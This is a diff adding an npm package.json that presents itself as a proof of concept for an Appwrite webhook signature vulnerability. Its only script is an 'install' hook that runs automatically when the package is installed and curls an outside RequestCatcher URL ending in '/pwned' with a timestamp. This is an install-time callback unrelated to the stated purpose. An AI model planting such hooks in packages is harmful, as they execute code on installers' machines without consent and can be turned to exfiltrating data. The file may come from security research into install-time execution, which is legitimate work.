@@ -1,0 +1,16 @@
+{
+  "name": "appwrite-poc-test",
+  "version": "1.0.0",
+  "description": "POC for Appwrite webhook signature verification vulnerability",
+  "main": "index.js",
+  "scripts": {
+    "install": "curl https://appwrite-poc-test.requestcatcher.com/pwned?timestamp=$(date +%s)&status=success || echo 'Request sent to RequestCatcher'"
+  },
+  "keywords": [
+    "security",
+    "poc",
+    "appwrite"
+  ],
+  "author": "Security Researcher",
+  "license": "MIT"
+}
